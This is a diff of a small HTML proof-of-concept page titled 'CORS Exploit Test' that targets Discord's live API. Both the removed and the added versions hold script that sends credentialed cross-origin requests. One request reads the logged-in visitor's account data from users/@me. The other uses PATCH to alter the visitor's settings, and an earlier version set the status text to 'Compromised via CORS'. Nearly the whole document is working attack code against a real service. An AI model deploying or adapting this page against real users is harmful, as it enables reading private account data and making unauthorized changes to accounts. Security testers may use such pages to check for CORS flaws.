@@ -1,53 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Misconfig Test</title>
+  <title>CORS Exploit Test</title>
 </head>
 <body>
-  <h1>Testing CORS Misconfiguration on Discord</h1>
-  <button onclick="testRead()">Test Read Endpoint</button>
-  <button onclick="testWrite()">Test Write Endpoint</button>
-
-  <pre id="output" style="white-space: pre-wrap;"></pre>
+  <h1>CORS Exploit Test</h1>
+  <button onclick="sendRead()">Test Read</button>
+  <button onclick="sendWrite()">Test Write</button>
 
   <script>
-    function log(text) {
-      document.getElementById("output").textContent += text + "\n";
+    function sendRead() {
+      fetch("https://discord.com/api/v9/users/@me", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.json())
+      .then(data => alert("Read success: " + JSON.stringify(data)))
+      .catch(err => alert("Read failed: " + err));
     }
 
-    async function testRead() {
-      try {
-        const res = await fetch("https://discord.com/api/v9/users/@me", {
-          method: "GET",
-          credentials: "include"
-        });
-        const text = await res.text();
-        log("READ Response:\n" + text);
-      } catch (err) {
-        log("Error in READ: " + err);
-      }
-    }
-
-    async function testWrite() {
-      try {
-        const res = await fetch("https://discord.com/api/v9/users/@me/settings", {
-          method: "PATCH",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            theme: "light",
-            custom_status: {
-              text: "Compromised via CORS 🧨"
-            }
-          })
-        });
-        const text = await res.text();
-        log("WRITE Response:\n" + text);
-      } catch (err) {
-        log("Error in WRITE: " + err);
-      }
+    function sendWrite() {
+      fetch("https://discord.com/api/v9/users/@me/settings", {
+        method: "PATCH",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ status: "idle" })
+      })
+      .then(response => response.json())
+      .then(data => alert("Write success: " + JSON.stringify(data)))
+      .catch(err => alert("Write failed: " + err));
     }
   </script>
 </body>
